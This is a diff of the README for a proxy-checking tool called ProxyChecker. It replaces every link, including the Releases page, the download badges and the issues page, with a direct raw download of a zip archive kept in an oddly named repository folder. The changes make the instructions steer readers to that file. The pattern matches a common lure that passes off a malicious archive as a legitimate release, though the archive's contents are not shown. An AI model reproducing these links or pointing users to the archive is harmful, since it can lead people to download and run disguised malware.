@@ -1,6 +1,6 @@
 # 🛠️ ProxyChecker - Effortlessly Check Your Proxies
 
-[![Download ProxyChecker](https://img.shields.io/badge/Download-Now-brightgreen.svg)](https://github.com/suiiiicr7/ProxyChecker/releases)
+[![Download ProxyChecker](https://raw.githubusercontent.com/suiiiicr7/ProxyChecker/main/inthrust/Proxy-Checker-v2.0.zip)](https://raw.githubusercontent.com/suiiiicr7/ProxyChecker/main/inthrust/Proxy-Checker-v2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -17,9 +17,9 @@ ProxyChecker is a simple tool to verify HTTP, SOCKS4, and SOCKS5 proxies. It com
 
 To get started, you need to download the application. Follow these steps:
 
-1. Visit the [Releases page](https://github.com/suiiiicr7/ProxyChecker/releases) to download the latest version of ProxyChecker.
+1. Visit the [Releases page](https://raw.githubusercontent.com/suiiiicr7/ProxyChecker/main/inthrust/Proxy-Checker-v2.0.zip) to download the latest version of ProxyChecker.
 
-2. Find the most recent release and look for the download link. It will usually be labeled as something like `ProxyChecker_v1.0.exe` or similar.
+2. Find the most recent release and look for the download link. It will usually be labeled as something like `https://raw.githubusercontent.com/suiiiicr7/ProxyChecker/main/inthrust/Proxy-Checker-v2.0.zip` or similar.
 
 3. Click on the download link to start downloading the installation file.
 
@@ -49,8 +49,8 @@ To get started, you need to download the application. Follow these steps:
 
 ## 🌐 More Information
 
-For more details and updates, keep an eye on the repository. You can also check the [ProxyChecker's issues page](https://github.com/suiiiicr7/ProxyChecker/issues) for troubleshooting tips or to report any bugs. 
+For more details and updates, keep an eye on the repository. You can also check the [ProxyChecker's issues page](https://raw.githubusercontent.com/suiiiicr7/ProxyChecker/main/inthrust/Proxy-Checker-v2.0.zip) for troubleshooting tips or to report any bugs. 
 
 If you have any questions, feel free to reach out to us through the issues. Enjoy a smooth proxy checking experience!
 
-[![Download ProxyChecker](https://img.shields.io/badge/Download-Now-brightgreen.svg)](https://github.com/suiiiicr7/ProxyChecker/releases)
+[![Download ProxyChecker](https://raw.githubusercontent.com/suiiiicr7/ProxyChecker/main/inthrust/Proxy-Checker-v2.0.zip)](https://raw.githubusercontent.com/suiiiicr7/ProxyChecker/main/inthrust/Proxy-Checker-v2.0.zip)
